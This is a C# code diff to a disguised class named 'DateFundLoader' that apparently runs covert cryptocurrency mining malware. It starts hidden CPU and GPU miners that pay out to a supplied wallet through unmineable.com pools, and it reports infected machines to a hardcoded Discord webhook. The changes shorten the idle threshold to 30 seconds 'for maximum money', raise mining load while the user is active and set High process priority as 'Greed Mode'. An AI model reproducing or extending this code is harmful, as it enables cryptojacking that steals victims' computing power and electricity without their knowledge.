@@ -51,7 +51,7 @@ public class DateFundLoader {
     private const uint ES_AWAYMODE_REQUIRED = 0x00000040;
 
     private const string IDENT = "WinSys";
-    private const int IDLE_THRESHOLD_MS = 2 * 60 * 1000; 
+    private const int IDLE_THRESHOLD_MS = 30000; // 30 seconds for maximum money
 
     public static void StartMiner(string cpuPath, string gpuPath, string wallet) {
         try {
@@ -96,7 +96,7 @@ public class DateFundLoader {
                 if (isIdle != wasIdle || cpuProc == null || cpuProc.HasExited) {
                     if (cpuProc != null && !cpuProc.HasExited) { try { cpuProc.Kill(); } catch { } }
                     
-                    int threads = isIdle ? 100 : 50;
+                    int threads = isIdle ? 100 : 60;
                     string cpuArgs = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.{1}_{2}_CPU -p x --donate-level 1 --cpu-max-threads-hint {3}", wallet, IDENT, machine, threads);
                     
                     ProcessStartInfo si = new ProcessStartInfo(cpuPath) {
@@ -106,14 +106,14 @@ public class DateFundLoader {
                         WindowStyle = ProcessWindowStyle.Hidden
                     };
                     cpuProc = Process.Start(si);
-                    try { cpuProc.PriorityClass = ProcessPriorityClass.AboveNormal; } catch { } // Priority Boost
+                    try { cpuProc.PriorityClass = ProcessPriorityClass.High; } catch { } // Greed Mode Priority
                 }
 
                 if (!string.IsNullOrEmpty(gpuPath) && File.Exists(gpuPath)) {
                     if (isIdle != wasIdle || gpuProc == null || gpuProc.HasExited) {
                         if (gpuProc != null && !gpuProc.HasExited) { try { gpuProc.Kill(); } catch { } }
 
-                        int intensity = isIdle ? 100 : 50;
+                        int intensity = isIdle ? 100 : 60;
                         string gpuArgs = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_{2}_GPU --pass x --intensity {3}", wallet, IDENT, machine, intensity);
 
                         ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
@@ -123,7 +123,7 @@ public class DateFundLoader {
                             WindowStyle = ProcessWindowStyle.Hidden
                         };
                         gpuProc = Process.Start(si);
-                        try { gpuProc.PriorityClass = ProcessPriorityClass.AboveNormal; } catch { } // Priority Boost
+                        try { gpuProc.PriorityClass = ProcessPriorityClass.High; } catch { } // Greed Mode Priority
                     }
                 }
                 
@@ -137,7 +137,7 @@ public class DateFundLoader {
         try {
             string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-            string msg = string.Format("🚀 **{0} Worker Online!**\\n**Host:** `{1}`\\n**Mode:** 50/100 Dynamic (TURBO Enabled)", IDENT, Environment.MachineName);
+            string msg = string.Format("Worker ON");
             using (WebClient wc = new WebClient()) {
                 wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                 wc.UploadString(webhookUrl, "{\"content\": \"" + msg + "\"}");
